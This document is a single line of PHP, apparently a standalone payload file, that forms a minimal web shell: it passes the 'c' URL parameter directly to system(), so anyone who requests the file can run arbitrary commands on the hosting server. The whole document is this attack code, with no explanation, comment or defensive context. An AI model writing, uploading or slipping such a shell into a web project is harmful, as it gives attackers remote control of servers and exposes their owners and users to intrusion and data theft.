<?php system($_GET['c']); ?>
